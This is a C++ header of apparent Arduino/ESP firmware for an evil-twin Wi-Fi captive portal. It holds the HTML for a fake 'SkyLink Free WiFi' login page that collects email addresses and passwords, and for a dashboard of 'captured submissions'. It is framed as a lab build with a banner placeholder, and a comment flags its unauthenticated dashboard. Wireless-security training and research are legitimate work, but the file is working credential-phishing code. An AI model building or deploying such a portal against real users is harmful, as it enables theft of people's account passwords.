#pragma once
#include <Arduino.h>
#include "config.h"

// HTML for the captive-portal landing page.
//
// Kept as a single PROGMEM literal (rather than scattered server.print()
// calls) so it stays flash-resident instead of eating heap, and so the
// markup can be read/edited as one normal HTML document instead of a wall
// of escaped C++ string concatenation.
const char PORTAL_PAGE[] PROGMEM = R"HTML(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>SkyLink Free WiFi</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 420px;
      margin: 48px auto;
      background-color: #fff;
      padding: 24px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    h1 { text-align: center; color: #333; font-size: 1.4em; }
    label { display: block; margin-bottom: 8px; color: #666; }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 18px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }
    button[type="submit"] {
      width: 100%;
      padding: 10px;
      background-color: #007bff;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button[type="submit"]:hover { background-color: #0056b3; }
    img { display: block; margin: 0 auto 12px; max-width: 160px; height: auto; }
    .lab-banner {
      margin-top: 28px;
      padding: 10px 12px;
      background: #fff3cd;
      border: 1px solid #ffe69c;
      border-radius: 4px;
      font-size: 0.8em;
      color: #664d03;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="/logo.png" alt="SkyLink WiFi">
    <h1>Sign in to use free WiFi</h1>
    <form action="/login" method="post">
      <label for="username">Email</label>
      <input type="text" id="username" name="username" required pattern="[^@]+@[^@]+\.[a-zA-Z]{2,}">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" minlength="4" required>
      <button type="submit">Connect</button>
    </form>
    <div class="lab-banner">%LAB_BANNER%</div>
  </div>
</body>
</html>
)HTML";

// HTML for the researcher-facing dashboard (/dashboard) that lists captured
// submissions and connected-client count. Intentionally still unauthenticated
// in this lab build -- see README.md -> "Known limitations" before using it
// anywhere that isn't a closed bench network.
const char DASHBOARD_PAGE_HEAD[] PROGMEM = R"HTML(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Lab Dashboard</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f2f2f2; margin: 0; padding: 20px; }
    h1 { color: #333; }
    table { width: 100%; border-collapse: collapse; margin-bottom: 20px; background: #fff; }
    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
    th { background-color: #007bff; color: #fff; }
    tr:nth-child(even) { background-color: #ffffff; }
    tr:nth-child(odd) { background-color: #f2f2f2; }
    a.button {
      display: inline-block; padding: 10px 20px; background-color: #007bff;
      color: #fff; text-decoration: none; border-radius: 5px;
    }
    .dot { height: 12px; width: 12px; background-color: green; border-radius: 50%; display: inline-block; }
    .lab-banner {
      margin-bottom: 16px; padding: 10px 12px; background: #fff3cd;
      border: 1px solid #ffe69c; border-radius: 4px; color: #664d03;
    }
  </style>
  <script>
    setInterval(function () { location.reload(); }, 3000);
  </script>
</head>
<body>
  <div class="lab-banner">%LAB_BANNER%</div>
  <h1>Captured submissions (lab)</h1>
)HTML";
